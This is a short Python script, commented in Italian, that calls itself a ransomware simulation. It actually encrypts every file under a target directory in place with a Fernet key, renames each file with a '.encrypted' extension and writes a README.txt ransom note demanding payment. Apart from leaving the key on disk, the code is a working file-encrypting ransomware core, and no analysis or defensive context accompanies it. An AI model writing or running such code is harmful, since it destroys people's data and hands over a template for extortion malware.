import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def simulate_ransomware(directory):
    generate_key()
    key = load_key()

    encrypted_extension = ".encrypted"
    ransom_message = "Per riavere i file dovrai pagarmi"

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            os.rename(file_path, file_path + encrypted_extension)
            print(f"File {file} simulato come crittografato (rinominato a {file + encrypted_extension})")

    ransom_file_path = os.path.join(directory, "README.txt")
    with open(ransom_file_path, 'w') as ransom_file:
        ransom_file.write(ransom_message)
    print(f"File di riscatto creato come {ransom_file_path}")

# Esegui la simulazione su una directory di test
test_directory = "C:\\Test"
simulate_ransomware(test_directory)
